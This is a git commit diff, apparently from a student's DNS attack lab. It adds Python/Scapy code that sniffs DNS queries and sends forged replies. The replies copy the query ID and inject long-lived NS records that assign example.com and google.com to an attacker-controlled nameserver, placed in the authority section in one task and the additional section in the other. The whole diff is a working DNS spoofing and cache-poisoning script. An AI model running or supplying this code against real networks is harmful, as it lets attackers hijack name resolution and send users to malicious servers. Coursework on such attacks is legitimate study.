82d8fda7ca742ca7204cb5aa80f6d5ec6dfa267a
Sumedh Girish <sumedh.girish@gmail.com>
2026-09-09 10:16:24 +0530

    [WEEK5] Added Task 4 and 5 code implementation

--- Lab5_LocalDNS/code/src/code/tasks.py
+++ Lab5_LocalDNS/code/src/code/tasks.py
@@ -89,6 +89,108 @@ class Task:
             filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
         )
 
+    @staticmethod
+    def _4():
+
+        TARGET_QRY = "_.example.com"
+        TARGET_REPLY1 = "example.com"
+        TARGET_REPLY2 = "google.com"
+
+        def spoof_dns_ns(pkt):
+            if (
+                pkt.haslayer(DNS)
+                and pkt.haslayer(DNSQR)
+                and TARGET_QRY in pkt[DNSQR].qname.decode("utf-8")
+                and pkt[DNS].qr == 0
+            ):
+                print(f"Got DNS Query: {pkt[IP].summary()}")
+
+                resp = (
+                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
+                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+                    / DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=0,
+                        qd=pkt[DNS].qd,
+                        ns=[
+                            DNSRR(
+                                rrname=TARGET_REPLY1.encode(),
+                                type="NS",
+                                rclass="IN",
+                                ttl=86400,
+                                rdata=ATTACKER_NS,
+                            ),
+                            DNSRR(
+                                rrname=TARGET_REPLY2.encode(),
+                                type="NS",
+                                rclass="IN",
+                                ttl=86400,
+                                rdata=ATTACKER_NS,
+                            ),
+                        ],
+                    )
+                )
+
+                send(resp)
+
+        _ = sniff(
+            iface=ATTACKER_IFACE,
+            prn=spoof_dns_ns,
+            filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
+        )
+
+    @staticmethod
+    def _5():
+
+        TARGET_QRY = "_.example.com"
+        TARGET_REPLY1 = "example.com"
+        TARGET_REPLY2 = "google.com"
+
+        def spoof_dns_ns(pkt):
+            if (
+                pkt.haslayer(DNS)
+                and pkt.haslayer(DNSQR)
+                and TARGET_QRY in pkt[DNSQR].qname.decode("utf-8")
+                and pkt[DNS].qr == 0
+            ):
+                print(f"Got DNS Query: {pkt[IP].summary()}")
+
+                resp = (
+                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
+                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+                    / DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=0,
+                        qd=pkt[DNS].qd,
+                        ar=[
+                            DNSRR(
+                                rrname=TARGET_REPLY1.encode(),
+                                type="NS",
+                                rclass="IN",
+                                ttl=86400,
+                                rdata=ATTACKER_NS,
+                            ),
+                            DNSRR(
+                                rrname=TARGET_REPLY2.encode(),
+                                type="NS",
+                                rclass="IN",
+                                ttl=86400,
+                                rdata=ATTACKER_NS,
+                            ),
+                        ],
+                    )
+                )
+
+                send(resp)
+
+        _ = sniff(
+            iface=ATTACKER_IFACE,
+            prn=spoof_dns_ns,
+            filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
+        )
+
 
 if __name__ == "__main__":
-    Task()._3()
+    Task()._4()
